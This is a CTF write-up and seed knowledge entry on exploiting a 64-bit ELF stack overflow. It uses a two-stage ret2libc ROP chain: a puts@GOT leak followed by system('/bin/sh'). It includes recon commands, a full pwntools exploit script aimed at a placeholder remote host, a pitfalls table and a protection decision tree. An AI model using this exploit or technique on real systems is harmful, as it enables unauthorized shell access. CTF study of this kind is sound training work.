# [Seed] CTF Pwn — x64 Stack Overflow + ROP Chain to Call system

## Scenario Classification
CTF / Binary Exploitation

## Goal Overview
A 64-bit ELF has an out-of-bounds write into a stack buffer via `read()`. The system has NX (non-executable stack) but no PIE and no stack canary. Use ROP gadgets to call libc's `system("/bin/sh")` and get a shell.

## Complete Execution Chain

1. Basic reconnaissance.
   ```bash
   file vuln          # ELF 64-bit, dynamically linked, not stripped
   checksec vuln      # NX enabled, No PIE, No Canary, Partial RELRO
   strings vuln | grep -i 'flag\|/bin/sh\|system'
   ```
2. Inspect main with IDA / Ghidra → find `read(0, buf, 0x100)` but `buf` is only 0x40 bytes.
3. Calculate the overflow offset.
   ```bash
   pwndbg> cyclic 200
   # Input into the target program; after it crashes, inspect RSP
   pwndbg> cyclic -l 0x6161616c
   # offset = 72
   ```
4. Because there is no PIE, PLT and GOT are at fixed addresses.
5. Stage 1 (no libc information): leak the contents of `puts@GOT` to calculate the libc base.
   ```python
   payload  = b'A' * 72
   payload += p64(POP_RDI)
   payload += p64(elf.got['puts'])
   payload += p64(elf.plt['puts'])
   payload += p64(elf.symbols['main'])     # return to main for a second use
   ```
6. Receive the puts output and identify the libc version (query with libc-database).
7. Stage 2: construct system("/bin/sh").
   ```python
   payload  = b'A' * 72
   payload += p64(POP_RDI) + p64(libc_base + libc.search(b'/bin/sh').next())
   payload += p64(libc_base + libc.symbols['system'])
   ```
8. Get a shell → cat flag.

## Pitfalls

| Issue | Cause | Solution | Time Spent |
|------|------|---------|------|
| Program crashes after ROP calls system, no shell | Stack not aligned to 16 bytes (Ubuntu 18.04+ is strict about movaps) | Add a ret gadget as padding before system | 30min |
| Works locally but not remotely | libc version mismatch | Leak one function address via puts → look up the exact version on libc-database | 40min |
| pwntools recv hangs | Program output uses setbuf(NULL) but stderr buffering is not disabled remotely | Synchronize precisely with sendlineafter / recvuntil | 15min |
| SIGPIPE immediately when attacking remote | Stage 2 payload still uses the previous round's io object | After `process` / `remote`, io must reuse the same connection; if the main process dies, it's over | 20min |
| ROPgadget outputs too much | The tool lists all gadgets by default | Filter with `ROPgadget --binary vuln --only "pop\|ret"` | 5min |

## Toolchain Findings

- **pwntools** is the de facto standard for writing exploits in Python (`from pwn import *`).
- **pwndbg** is 10x more powerful than vanilla GDB (includes cyclic / vmmap / heap commands).
- **ROPgadget** vs **ropper**: ropper has friendlier output and supports searching for syscall chains.
- **libc-database** matches the exact libc version from one leaked libc function address.
- **one_gadget** finds a libc gadget that directly execve("/bin/sh"), shorter than a manual ROP chain.

## Key Code/Commands

Complete exploit template:

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./vuln')
libc = ELF('./libc.so.6')

POP_RDI = 0x401243   # ROPgadget --binary vuln | grep "pop rdi"
RET     = 0x40101a   # for stack alignment

def exp():
    io = remote('chal.example.com', 31337)
    # io = process('./vuln')

    # Stage 1: leak puts@GOT
    payload  = b'A' * 72
    payload += p64(POP_RDI) + p64(elf.got['puts'])
    payload += p64(elf.plt['puts'])
    payload += p64(elf.symbols['main'])

    io.sendlineafter(b'> ', payload)
    leak = u64(io.recvline().strip().ljust(8, b'\x00'))
    libc.address = leak - libc.symbols['puts']
    log.success(f'libc base = {hex(libc.address)}')

    # Stage 2: system('/bin/sh')
    bin_sh = next(libc.search(b'/bin/sh'))
    payload  = b'A' * 72
    payload += p64(RET)             # 16-byte stack alignment
    payload += p64(POP_RDI) + p64(bin_sh)
    payload += p64(libc.symbols['system'])

    io.sendlineafter(b'> ', payload)
    io.interactive()

if __name__ == '__main__':
    exp()
```

## Suggestions for This Package

- The CTF-Sandbox-Orchestrator's `competition-reverse-pwn` should add `pwn-rop-cheatsheet.md` and turn this workflow into a template.
- Add pwntools / pwndbg / one_gadget to the bootstrap manifest.

## Reusable Patterns/Script Snippets

**ROP exploitation decision tree**:

```text
checksec → inspect protections
├── No NX → shellcode directly (old-school approach)
├── NX + no PIE → classic ret2libc
├── NX + PIE + no Canary → first leak the PIE base → ret2libc
├── Canary present → first find a way to leak the Canary (format string / off-by-one)
└── Full RELRO + Canary + PIE → difficult; common techniques: fork without re-randomizing ASLR / __libc_start_main / SROP
```

**libc leak → standard two-stage payload**:

```text
Stage 1: leak puts@GOT → calculate libc base → return to main
Stage 2: pop rdi; "/bin/sh"; ret; system
```

## Evolution Actions
- [ ] Add a pwn quick-reference page to the CTF orchestrator
- [ ] Add pwntools / pwndbg / one_gadget to bootstrap-manifest
- [ ] Reference this case in reverse-engineering/tools-dynamic.md

## Environment Information
- Kali 2026.x / Ubuntu 22.04
- pwntools 4.x, pwndbg latest, ROPgadget 7.x
- libc version: glibc 2.31 / 2.35 (common in CTF)
- Target architecture: x86_64

## Anonymization Requirements
This entry is seed data, written based on public CTF technical patterns, and does not involve any real challenge or closed-source system.
